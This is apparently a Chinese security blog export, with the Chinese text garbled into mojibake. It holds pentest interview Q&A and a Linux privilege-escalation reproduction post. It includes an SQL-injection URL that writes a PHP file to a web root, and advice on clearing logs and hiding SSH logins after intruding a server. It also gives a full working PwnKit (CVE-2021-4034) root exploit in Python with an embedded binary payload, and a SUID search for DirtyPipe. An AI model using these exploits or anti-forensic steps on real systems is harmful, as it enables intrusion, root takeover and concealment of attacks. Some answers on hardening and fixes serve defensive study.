<h3 id="å¦‚ä½•ç»•è¿‡-wafï¼Ÿ"><a href="#å¦‚ä½•ç»•è¿‡-wafï¼Ÿ" class="headerlink" title="å¦‚ä½•ç»•è¿‡ wafï¼Ÿ"></a>å¦‚ä½•ç»•è¿‡ wafï¼Ÿ</h3><p>  å¤§å°å†™<br>  å†…æ•›æ³¨é‡Š<br>  æ¢è¡Œç¬¦<br>  ç¼–ç <br>  å‚æ•°æ±¡æŸ“</p>
<h3 id="æ–‡ä»¶ä¸Šä¼ æœ‰å“ªäº›é˜²æŠ¤æ–¹å¼"><a href="#æ–‡ä»¶ä¸Šä¼ æœ‰å“ªäº›é˜²æŠ¤æ–¹å¼" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ æœ‰å“ªäº›é˜²æŠ¤æ–¹å¼"></a>æ–‡ä»¶ä¸Šä¼ æœ‰å“ªäº›é˜²æŠ¤æ–¹å¼</h3><p>  æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œ<br>  ç™½åå•æœºåˆ¶<br>  é‡å‘½å<br>  ä½¿ç”¨å®‰å…¨è®¾å¤‡é˜²å¾¡</p>
<h3 id="æ³¨å…¥æœ‰é˜²æŠ¤æ€ä¹ˆåŠ"><a href="#æ³¨å…¥æœ‰é˜²æŠ¤æ€ä¹ˆåŠ" class="headerlink" title="æ³¨å…¥æœ‰é˜²æŠ¤æ€ä¹ˆåŠ"></a>æ³¨å…¥æœ‰é˜²æŠ¤æ€ä¹ˆåŠ</h3><p>  ç»•waf</p>
<h3 id="ddos-å¦‚ä½•é˜²æŠ¤"><a href="#ddos-å¦‚ä½•é˜²æŠ¤" class="headerlink" title="ddos å¦‚ä½•é˜²æŠ¤"></a>ddos å¦‚ä½•é˜²æŠ¤</h3><p>  SYN cookie(ä¸ºæ¯ä¸ªipåˆ†é…ä¸€ä¸ªâ€cookieâ€)<br>  ç»Ÿè®¡ipè®¿é—®é¢‘ç‡ banip<br>  ä½¿ç”¨å®‰å…¨è®¾å¤‡</p>
<h3 id="ä¸ºä»€ä¹ˆå‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥é˜²æ­¢-sql-æ³¨å…¥"><a href="#ä¸ºä»€ä¹ˆå‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥é˜²æ­¢-sql-æ³¨å…¥" class="headerlink" title="ä¸ºä»€ä¹ˆå‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥é˜²æ­¢ sql æ³¨å…¥"></a>ä¸ºä»€ä¹ˆå‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥é˜²æ­¢ sql æ³¨å…¥</h3><p>  å‚æ•°åŒ–æŸ¥è¯¢å¯ä»¥å¯¹å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œè¿˜èƒ½å¤Ÿé‡ç”¨æ‰§è¡Œè®¡åˆ’ï¼Œè‹¥æ‰§è¡Œè®¡åˆ’è¢«é‡ç”¨çš„è¯ï¼ŒSQLæ‰€è¦è¡¨è¾¾çš„è¯­ä¹‰æ˜¯ä¸ä¼šå˜åŒ–çš„<br>  ä¹‹å‰å­¦javawebæ—¶å€™ç”¨è¿‡é¢„å¤„ç†çš„æ–¹æ³• æŠŠå˜é‡ç”¨?ä»£æ›¿ ç„¶åå†å»å†™é‚£ä¸ªå‡½æ•°</p>
<h3 id="sql-å¦‚ä½•å†™-shell-å•å¼•å·è¢«è¿‡æ»¤æ€ä¹ˆåŠ"><a href="#sql-å¦‚ä½•å†™-shell-å•å¼•å·è¢«è¿‡æ»¤æ€ä¹ˆåŠ" class="headerlink" title="sql å¦‚ä½•å†™ shell/å•å¼•å·è¢«è¿‡æ»¤æ€ä¹ˆåŠ"></a>sql å¦‚ä½•å†™ shell/å•å¼•å·è¢«è¿‡æ»¤æ€ä¹ˆåŠ</h3><p>  &lt;1&gt; å†™shell(rootæƒé™ï¼ŒGPCå…³é—­ï¼ŒçŸ¥é“æ–‡ä»¶è·¯å¾„ï¼Œoutfileå‡½æ•°)<br>  <code>http://127.0.0.1:81/sqli.php?id=1 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39; FIELDS TERMINATED BY &#39;&#39;</code><br>  <code>http://127.0.0.1:81/sqli.php?id=-1 union select 1,0x3c3f70687020706870696e666f28293b203f3e,3,4 into outfile &#39;C:\\wamp64\\www\\phpinfo.php&#39;</code><br>  &lt;2&gt; å®½å­—èŠ‚æ³¨å…¥</p>
<h3 id="å¯¹äº-XSS-æ€ä¹ˆä¿®è¡¥å»ºè®®"><a href="#å¯¹äº-XSS-æ€ä¹ˆä¿®è¡¥å»ºè®®" class="headerlink" title="å¯¹äº XSS æ€ä¹ˆä¿®è¡¥å»ºè®®"></a>å¯¹äº XSS æ€ä¹ˆä¿®è¡¥å»ºè®®</h3><p>  è¾“å…¥ç¼–ç è½¬ä¹‰(å¯ä»¥ç”¨htmlå®ä½“ç¼–ç )<br>  ç™½åå•è¿‡æ»¤(è¿‡æ»¤ä¸€äº›æ ‡ç­¾å’Œjsäº‹ä»¶)<br>  httponly</p>
<h3 id="æ·»åŠ -tokenå’Œ-referer-åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜ï¼Ÿ"><a href="#æ·»åŠ -tokenå’Œ-referer-åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜ï¼Ÿ" class="headerlink" title="æ·»åŠ  tokenå’Œ referer åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜ï¼Ÿ"></a>æ·»åŠ  tokenå’Œ referer åšæ¨ªå‘å¯¹æ¯”ï¼Œè°å®‰å…¨ç­‰çº§é«˜ï¼Ÿ</h3><p>  tokenå®‰å…¨ç­‰çº§æ›´é«˜ï¼Œå› ä¸ºå¹¶ä¸æ˜¯ä»»ä½•æœåŠ¡å™¨éƒ½å¯ä»¥å–å¾—refererï¼Œå¦‚æœä»HTTPSè·³åˆ°HTTPï¼Œä¹Ÿä¸ä¼šå‘é€refererã€‚<br>  å¹¶ä¸”FLASHä¸€äº›ç‰ˆæœ¬ä¸­å¯ä»¥è‡ªå®šä¹‰refererã€‚<br>  ä½†æ˜¯tokençš„è¯ï¼Œè¦ä¿è¯å…¶è¶³å¤Ÿéšæœºä¸”ä¸å¯æ³„éœ²</p>
<h3 id="å¸¸è§çš„ä¸Šä¼ ç»•è¿‡æ–¹å¼"><a href="#å¸¸è§çš„ä¸Šä¼ ç»•è¿‡æ–¹å¼" class="headerlink" title="å¸¸è§çš„ä¸Šä¼ ç»•è¿‡æ–¹å¼"></a>å¸¸è§çš„ä¸Šä¼ ç»•è¿‡æ–¹å¼</h3><p>  å‰ç«¯jséªŒè¯ bpæŠ“åŒ…æ”¹åŒ…<br>  å¤§å°å†™ã€åŒå†™<br>  00æˆªæ–­ %00 0x00<br>  mimeç±»å‹ç»•è¿‡ æ”¹Content-Type</p>
<h3 id="å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°"><a href="#å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°" class="headerlink" title="å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°"></a>å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°</h3><p>  <code>PHP: include(), include_once(), require(),require_once</code><br>  å¯å‚è€ƒ <a href="https://err0rzz.github.io/2017/08/31/file_include/">https://err0rzz.github.io/2017/08/31/file_include/</a></p>
<h3 id="å…¥ä¾µ-Linux-æœåŠ¡å™¨åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—ï¼Ÿ"><a href="#å…¥ä¾µ-Linux-æœåŠ¡å™¨åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—ï¼Ÿ" class="headerlink" title="å…¥ä¾µ Linux æœåŠ¡å™¨åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—ï¼Ÿ"></a>å…¥ä¾µ Linux æœåŠ¡å™¨åéœ€è¦æ¸…é™¤å“ªäº›æ—¥å¿—ï¼Ÿ</h3><p>  history   vim ~/.bash_history<br>  ç³»ç»Ÿæ—¥å¿—<br>  webæ—¥å¿—   åˆ é™¤æŒ‡å®šip æ—¶é—´ç‚¹<br>  sshç™»å½•è®°å½• éšèº«ç™»å½•ç³»ç»Ÿï¼Œä¸ä¼šè¢«wã€whoã€lastç­‰æŒ‡ä»¤æ£€æµ‹åˆ°(<code>ssh -T root@192.168.0.1 /bin/bash -i</code>)<br>              ä¸è®°å½•sshå…¬é’¥åœ¨æœ¬åœ°.sshç›®å½•ä¸­(<code>ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash â€“i</code>)</p>
<h3 id="å¦‚ä½•åŠ å›ºä¸€ä¸ªåŸŸç¯å¢ƒä¸‹çš„-Windows-æ¡Œé¢å·¥ä½œç¯å¢ƒï¼Ÿè¯·ç»™å‡ºä½ çš„æ€è·¯ã€‚"><a href="#å¦‚ä½•åŠ å›ºä¸€ä¸ªåŸŸç¯å¢ƒä¸‹çš„-Windows-æ¡Œé¢å·¥ä½œç¯å¢ƒï¼Ÿè¯·ç»™å‡ºä½ çš„æ€è·¯ã€‚" class="headerlink" title="å¦‚ä½•åŠ å›ºä¸€ä¸ªåŸŸç¯å¢ƒä¸‹çš„ Windows æ¡Œé¢å·¥ä½œç¯å¢ƒï¼Ÿè¯·ç»™å‡ºä½ çš„æ€è·¯ã€‚"></a>å¦‚ä½•åŠ å›ºä¸€ä¸ªåŸŸç¯å¢ƒä¸‹çš„ Windows æ¡Œé¢å·¥ä½œç¯å¢ƒï¼Ÿè¯·ç»™å‡ºä½ çš„æ€è·¯ã€‚</h3><p>  &lt;1&gt; ä¿®è¡¥è¡¥ä¸ï¼ŒåŠæ—¶å¤‡ä»½<br>  &lt;2&gt; æ’æŸ¥å¼±å£ä»¤å’Œè´¦å·<br>  &lt;3&gt; å¼€å¯æœåŠ¡ä¸ç«¯å£é…ç½® å…³é—­ä¸å¿…è¦çš„ç«¯å£å’ŒæœåŠ¡<br>  &lt;4&gt; æ—¥å¿—é…ç½®ä¸å®¡æ ¸  å¢åŠ æ—¥å¿—å¤§å°ä»¥ä¿è¯å®Œæ•´ å¯¹ç³»ç»Ÿäº‹ä»¶å®¡æ ¸<br>  &lt;5&gt; ç³»ç»Ÿå®‰å…¨è®¾ç½®  è®¾ç½®å±ä¿å’Œè¿œç¨‹è¿æ¥æŒ‚èµ·æ—¶é—´ï¼Œç¦æ­¢ç³»ç»Ÿè‡ªåŠ¨ç™»å½•<br>  &lt;6&gt; æˆæƒ  åªå…è®¸ç®¡ç†å‘˜ç»„ç”¨æˆ·è¿œç¨‹å¼€æœºå…³æœº åªæœ‰æˆæƒç”¨æˆ·æ‰å¯è¿œç¨‹ç™»å½•æˆ–æœ¬åœ°ç™»å½•<br>  &lt;7&gt; æ–‡ä»¶ç³»ç»Ÿæƒé™ åˆ é™¤everyoneæƒé™æˆ–å–æ¶ˆeveryoneçš„å†™æƒé™ é™åˆ¶éƒ¨åˆ†ç³»ç»Ÿå‘½ä»¤çš„è®¿é—®æƒé™</p>
<h3 id="å®å¡”ç¦æ­¢PHPå‡½æ•°å¦‚ä½•ç»•è¿‡ï¼Ÿ"><a href="#å®å¡”ç¦æ­¢PHPå‡½æ•°å¦‚ä½•ç»•è¿‡ï¼Ÿ" class="headerlink" title="å®å¡”ç¦æ­¢PHPå‡½æ•°å¦‚ä½•ç»•è¿‡ï¼Ÿ"></a>å®å¡”ç¦æ­¢PHPå‡½æ•°å¦‚ä½•ç»•è¿‡ï¼Ÿ</h3><p>  èšå‰‘disable_functionæ’ä»¶</p>
<h3 id="fastjsonä¸å‡ºç½‘å¦‚ä½•åˆ©ç”¨ï¼Ÿ"><a href="#fastjsonä¸å‡ºç½‘å¦‚ä½•åˆ©ç”¨ï¼Ÿ" class="headerlink" title="fastjsonä¸å‡ºç½‘å¦‚ä½•åˆ©ç”¨ï¼Ÿ"></a>fastjsonä¸å‡ºç½‘å¦‚ä½•åˆ©ç”¨ï¼Ÿ</h3><p>  dnslogå›æ˜¾</p>
<h3 id="åŸŸå†…çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼ˆéåŸŸç”¨æˆ·ï¼‰å¦‚ä½•è¿›è¡Œåˆ©ç”¨ï¼Ÿ"><a href="#åŸŸå†…çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼ˆéåŸŸç”¨æˆ·ï¼‰å¦‚ä½•è¿›è¡Œåˆ©ç”¨ï¼Ÿ" class="headerlink" title="åŸŸå†…çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼ˆéåŸŸç”¨æˆ·ï¼‰å¦‚ä½•è¿›è¡Œåˆ©ç”¨ï¼Ÿ"></a>åŸŸå†…çš„ä¸€ä¸ªæ™®é€šç”¨æˆ·ï¼ˆéåŸŸç”¨æˆ·ï¼‰å¦‚ä½•è¿›è¡Œåˆ©ç”¨ï¼Ÿ</h3><p>  åŸŸå†…ææƒï¼Ÿï¼ŸCVE 2021-42287 / CVE 2021-42278</p>
<h3 id="goè¯­è¨€å…æ€shellcodeå¦‚ä½•å…æ€ï¼Ÿå…æ€åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#goè¯­è¨€å…æ€shellcodeå¦‚ä½•å…æ€ï¼Ÿå…æ€åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="goè¯­è¨€å…æ€shellcodeå¦‚ä½•å…æ€ï¼Ÿå…æ€åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ"></a>goè¯­è¨€å…æ€shellcodeå¦‚ä½•å…æ€ï¼Ÿå…æ€åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</h3><h3 id="windows-defenderé˜²å¾¡æœºåˆ¶åŸç†ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ"><a href="#windows-defenderé˜²å¾¡æœºåˆ¶åŸç†ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ" class="headerlink" title="windows defenderé˜²å¾¡æœºåˆ¶åŸç†ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ"></a>windows defenderé˜²å¾¡æœºåˆ¶åŸç†ï¼Œå¦‚ä½•ç»•è¿‡ï¼Ÿ</h3><h3 id="å¡å·´æ–¯åŸºè¿›ç¨‹ä¿æŠ¤å¦‚ä½•ç»•è¿‡è¿›è¡Œè¿›ç¨‹è¿ç§»ï¼Ÿ"><a href="#å¡å·´æ–¯åŸºè¿›ç¨‹ä¿æŠ¤å¦‚ä½•ç»•è¿‡è¿›è¡Œè¿›ç¨‹è¿ç§»ï¼Ÿ" class="headerlink" title="å¡å·´æ–¯åŸºè¿›ç¨‹ä¿æŠ¤å¦‚ä½•ç»•è¿‡è¿›è¡Œè¿›ç¨‹è¿ç§»ï¼Ÿ"></a>å¡å·´æ–¯åŸºè¿›ç¨‹ä¿æŠ¤å¦‚ä½•ç»•è¿‡è¿›è¡Œè¿›ç¨‹è¿ç§»ï¼Ÿ</h3><h3 id="å·¥ä½œç»„ç¯å¢ƒä¸‹å¦‚ä½•è¿›è¡Œæ¸—é€ï¼Ÿ"><a href="#å·¥ä½œç»„ç¯å¢ƒä¸‹å¦‚ä½•è¿›è¡Œæ¸—é€ï¼Ÿ" class="headerlink" title="å·¥ä½œç»„ç¯å¢ƒä¸‹å¦‚ä½•è¿›è¡Œæ¸—é€ï¼Ÿ"></a>å·¥ä½œç»„ç¯å¢ƒä¸‹å¦‚ä½•è¿›è¡Œæ¸—é€ï¼Ÿ</h3><h3 id="å†…å­˜é©¬çš„æœºåˆ¶ï¼Ÿ"><a href="#å†…å­˜é©¬çš„æœºåˆ¶ï¼Ÿ" class="headerlink" title="å†…å­˜é©¬çš„æœºåˆ¶ï¼Ÿ"></a>å†…å­˜é©¬çš„æœºåˆ¶ï¼Ÿ</h3><h3 id="è¯´å‡ºå°è±¡æ¯”è¾ƒæ·±åˆ»çš„ä¸€æ¬¡å¤–ç½‘æ‰“ç‚¹è¿›å…¥å†…ç½‘ï¼Ÿ"><a href="#è¯´å‡ºå°è±¡æ¯”è¾ƒæ·±åˆ»çš„ä¸€æ¬¡å¤–ç½‘æ‰“ç‚¹è¿›å…¥å†…ç½‘ï¼Ÿ" class="headerlink" title="è¯´å‡ºå°è±¡æ¯”è¾ƒæ·±åˆ»çš„ä¸€æ¬¡å¤–ç½‘æ‰“ç‚¹è¿›å…¥å†…ç½‘ï¼Ÿ"></a>è¯´å‡ºå°è±¡æ¯”è¾ƒæ·±åˆ»çš„ä¸€æ¬¡å¤–ç½‘æ‰“ç‚¹è¿›å…¥å†…ç½‘ï¼Ÿ</h3><h3 id="è¯ä¹¦é€æ˜åº¦çš„å±å®³ï¼Ÿ"><a href="#è¯ä¹¦é€æ˜åº¦çš„å±å®³ï¼Ÿ" class="headerlink" title="è¯ä¹¦é€æ˜åº¦çš„å±å®³ï¼Ÿ"></a>è¯ä¹¦é€æ˜åº¦çš„å±å®³ï¼Ÿ</h3>]]></content>
  </entry>
  <entry>
    <title>Linuxææƒæ¼æ´å¤ç°</title>
    <url>/posts/1a565dd/</url>
    <content><![CDATA[<h2 id="Polkitæƒé™æå‡æ¼æ´-CVE-2021-4034"><a href="#Polkitæƒé™æå‡æ¼æ´-CVE-2021-4034" class="headerlink" title="Polkitæƒé™æå‡æ¼æ´ CVE-2021-4034"></a>Polkitæƒé™æå‡æ¼æ´ CVE-2021-4034</h2><h3 id="æ¼æ´æè¿°"><a href="#æ¼æ´æè¿°" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>Qualys ç ”ç©¶å›¢é˜Ÿåœ¨ polkit çš„ pkexec ä¸­å‘ç°äº†ä¸€ä¸ªå†…å­˜æŸåæ¼æ´ï¼Œè¯¥ SUID æ ¹ç¨‹åºé»˜è®¤å®‰è£…åœ¨æ¯ä¸ªä¸»è¦çš„ Linux å‘è¡Œç‰ˆä¸Šã€‚è¿™ä¸ªæ˜“äºåˆ©ç”¨çš„æ¼æ´å…è®¸ä»»ä½•éç‰¹æƒç”¨æˆ·é€šè¿‡åœ¨å…¶é»˜è®¤é…ç½®ä¸­åˆ©ç”¨æ­¤æ¼æ´æ¥è·å¾—æ˜“å—æ”»å‡»ä¸»æœºä¸Šçš„å®Œå…¨ root æƒé™ã€‚</p>
<h3 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h3><ul>
<li>Polkit &gt; 2009</li>
</ul>
<h3 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><blockquote>
<p>POCæ¥æº: <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034</a></p>
</blockquote>
<br>

<p><img src="/posts/1a565dd/1.png" alt="æˆªå›¾"></p>
<br>

<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><blockquote>
<p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># poc for https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt found by qualys</span></span><br><span class="line"><span class="comment"># hardcoded amd64 lib</span></span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes.util <span class="keyword">import</span> find_library</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">payload = zlib.decompress(</span><br><span class="line">    base64.b64decode(</span><br><span class="line">        <span class="string">&quot;&quot;&quot;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&quot;&quot;&quot;</span></span><br><span class="line">    )</span><br><span class="line">)</span><br><span class="line">libc = CDLL(find_library(<span class="string">&quot;c&quot;</span>))</span><br><span class="line">libc.execve.argtypes = c_char_p, POINTER(c_char_p), POINTER(c_char_p)</span><br><span class="line">libc.execve.restype = c_ssize_t</span><br><span class="line"></span><br><span class="line">wd = tempfile.mkdtemp()</span><br><span class="line"><span class="built_in">open</span>(wd + <span class="string">&quot;/pwn.so&quot;</span>, <span class="string">&quot;wb&quot;</span>).write(payload)</span><br><span class="line">os.mkdir(wd + <span class="string">&quot;/gconv/&quot;</span>)</span><br><span class="line"><span class="built_in">open</span>(wd + <span class="string">&quot;/gconv/gconv-modules&quot;</span>, <span class="string">&quot;w&quot;</span>).write(</span><br><span class="line">    <span class="string">&quot;module  UTF-8//    INTERNAL    ../pwn    2&quot;</span></span><br><span class="line">)</span><br><span class="line">os.mkdir(wd + <span class="string">&quot;/GCONV_PATH=.&quot;</span>)</span><br><span class="line">os.mknod(wd + <span class="string">&quot;/GCONV_PATH=./gconv&quot;</span>)</span><br><span class="line">os.chmod(wd + <span class="string">&quot;/GCONV_PATH=.&quot;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.chmod(wd + <span class="string">&quot;/GCONV_PATH=./gconv&quot;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.chmod(wd + <span class="string">&quot;/pwn.so&quot;</span>, <span class="number">0o777</span>)</span><br><span class="line">os.chdir(wd)</span><br><span class="line">cmd = <span class="string">b&quot;/usr/bin/pkexec&quot;</span></span><br><span class="line">argv = []</span><br><span class="line">envp = [</span><br><span class="line">    <span class="string">b&quot;gconv&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;PATH=GCONV_PATH=.&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;LC_MESSAGES=en_US.UTF-8&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;XAUTHORITY=../gconv&quot;</span>,</span><br><span class="line">    <span class="string">b&quot;&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">cargv = (c_char_p * (<span class="built_in">len</span>(argv) + <span class="number">1</span>))(*argv, <span class="literal">None</span>)</span><br><span class="line">cenv = (c_char_p * (<span class="built_in">len</span>(envp) + <span class="number">1</span>))(*envp, <span class="literal">None</span>)</span><br><span class="line">libc.execve(cmd, cargv, cenv)</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="DirtyPipeæœ¬åœ°ææƒ-CVE-2022-0847"><a href="#DirtyPipeæœ¬åœ°ææƒ-CVE-2022-0847" class="headerlink" title="DirtyPipeæœ¬åœ°ææƒ CVE-2022-0847"></a>DirtyPipeæœ¬åœ°ææƒ CVE-2022-0847</h2><h3 id="æ¼æ´æè¿°-1"><a href="#æ¼æ´æè¿°-1" class="headerlink" title="æ¼æ´æè¿°"></a>æ¼æ´æè¿°</h3><p>CVE-2022-0847-DirtyPipe-Exploit CVE-2022-0847 æ˜¯å­˜åœ¨äº Linuxå†…æ ¸ 5.8 åŠä¹‹åç‰ˆæœ¬ä¸­çš„æœ¬åœ°ææƒæ¼æ´ã€‚æ”»å‡»è€…é€šè¿‡åˆ©ç”¨æ­¤æ¼æ´ï¼Œå¯è¦†ç›–é‡å†™ä»»æ„å¯è¯»æ–‡ä»¶ä¸­çš„æ•°æ®ï¼Œä»è€Œå¯å°†æ™®é€šæƒé™çš„ç”¨æˆ·æå‡åˆ°ç‰¹æƒ rootã€‚ CVE-2022-0847 çš„æ¼æ´åŸç†ç±»ä¼¼äº CVE-2016-5195 è„ç‰›æ¼æ´ï¼ˆDirty Cowï¼‰ï¼Œä½†å®ƒæ›´å®¹æ˜“è¢«åˆ©ç”¨ã€‚æ¼æ´ä½œè€…å°†æ­¤æ¼æ´å‘½åä¸ºâ€œDirty Pipeâ€</p>
<h3 id="æ¼æ´å½±å“"><a href="#æ¼æ´å½±å“" class="headerlink" title="æ¼æ´å½±å“"></a>æ¼æ´å½±å“</h3><ul>
<li>Linuxå†…æ ¸ 5.8 åŠä¹‹åç‰ˆæœ¬</li>
</ul>
<h3 id="æ¼æ´å¤ç°-1"><a href="#æ¼æ´å¤ç°-1" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h3><p>æŸ¥æ‰¾å…·æœ‰suidæƒé™çš„å¯æ‰§è¡Œæ–‡ä»¶</p>
<p><code>find / -user root -perm /4000 2&gt;/dev/null</code></p>
<p><img src="/posts/1a565dd/2.png" alt="æˆªå›¾"></p>
<br>

<p>éœ€è¦åœ¨ç›®æ ‡æœºå™¨ä¸Šä½¿ç”¨gccè¿›è¡Œç¼–è¯‘</p>
<p><img src="/posts/1a565dd/3.png" alt="æˆªå›¾"></p>
<br>

